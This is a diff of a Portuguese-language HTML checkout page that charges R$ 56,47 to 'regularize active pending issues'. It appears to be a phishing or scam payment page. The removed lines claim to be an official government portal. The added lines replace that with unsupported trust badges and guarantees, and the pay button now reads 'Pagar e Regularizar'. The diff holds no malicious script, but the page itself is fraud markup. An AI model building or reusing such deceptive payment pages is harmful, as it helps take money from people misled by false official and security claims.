+    min-width: 45px; /* Garante que o espaço não mude durante a contagem */
+    text-align: center;
+}
     </style>
 </head>
 <body>
@@ -1567,27 +1183,20 @@
                             <div class="checkbox-group">
                                 <input type="checkbox" id="dataAccuracy" name="dataAccuracy" class="checkbox-input" required>
                                 <label for="dataAccuracy" class="checkbox-label">
-                                    Confirmo que as informações fornecidas são <strong>verdadeiras</strong>
-                                </label>
-                            </div>
-
-                            <div class="checkbox-group">
-                                <input type="checkbox" id="lgpdAccept" name="lgpdAccept" class="checkbox-input" required>
-                                <label for="lgpdAccept" class="checkbox-label">
-                                    Autorizo o processamento de dados conforme a <strong>Lei Geral de Proteção de Dados (LGPD)</strong>
+                                    Confirmo que todas as informações fornecidas são <strong>verdadeiras e legítimas</strong>
                                 </label>
                             </div>
                         </div>
 
                         <form id="confirmationForm">
                             <div class="button-group">
-                                <button type="button" id="btn-voltar" class="btn btn-secondary">
+                                <button type="button" class="btn btn-secondary" onclick="goToStep(1)">
                                     <i class="fas fa-arrow-left"></i>
                                     Voltar
                                 </button>
-                                <button type="submit" id="btn-pagar" class="btn btn-primary">
-                                    <i class="fas fa-lock"></i>
-                                    Pagar Agora
+                                <button type="submit" class="btn btn-primary">
+                                    <i class="fas fa-credit-card"></i>
+                                    Pagar e Regularizar
                                 </button>
                             </div>
                         </form>
@@ -1596,43 +1205,58 @@
             </div>
         </main>
 
-        <!-- Sidebar (Desktop) -->
+        <!-- Sidebar -->
         <aside class="sidebar">
-            <!-- Resumo de Valores -->
             <div class="summary-card">
-                <div class="summary-title">Resumo da Regularização</div>
                 <div class="price-display">
-                    <div class="price-label">Valor Total</div>
-                    <div class="price-value" id="sidebarPrice">R$ 56,47</div>
+                    <div class="price-label">Valor das Pendências Ativas</div>
+                    <div class="price-value">R$ 56,47</div>
                 </div>
             </div>
 
-            <!-- Seção de Confiança -->
             <div class="trust-section">
-                <div class="trust-title">Por que confiar?</div>
+                <h3 class="trust-title">Garantias e Benefícios</h3>
+                
                 <div class="trust-item">
                     <div class="trust-icon">
                         <i class="fas fa-check"></i>
                     </div>
-                    <div>Portal oficial do governo</div>
+                    <div class="trust-text">Processo 100% seguro e certificado</div>
                 </div>
+                
                 <div class="trust-item">
                     <div class="trust-icon">
                         <i class="fas fa-check"></i>
                     </div>
-                    <div>Certificado SSL 256-bit</div>
+                    <div class="trust-text">Regularização em até 48 horas úteis</div>
                 </div>
+                
                 <div class="trust-item">
                     <div class="trust-icon">
                         <i class="fas fa-check"></i>
                     </div>
-                    <div>Dados protegidos por LGPD</div>
+                    <div class="trust-text">Suporte especializado incluído</div>
                 </div>
+                
                 <div class="trust-item">
                     <div class="trust-icon">
                         <i class="fas fa-check"></i>
                     </div>
-                    <div>Processamento 100% seguro</div>
+                    <div class="trust-text">Documentos em formato digital</div>
+                </div>
+
+                <div class="trust-item">
+                    <div class="trust-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div class="trust-text">Conformidade com legislação vigente</div>
+                </div>
+                
+                <div class="trust-item">
+                    <div class="trust-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div class="trust-text">Garantia de satisfação</div>
                 </div>
             </div>
         </aside>
@@ -1642,7 +1266,7 @@
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-content">
             <div class="loading-spinner"></div>
-            <div class="loading-text">Processando seu pagamento...</div>
+            <div class="loading-text">Processando solicitação...</div>
         </div>
     </div>
 
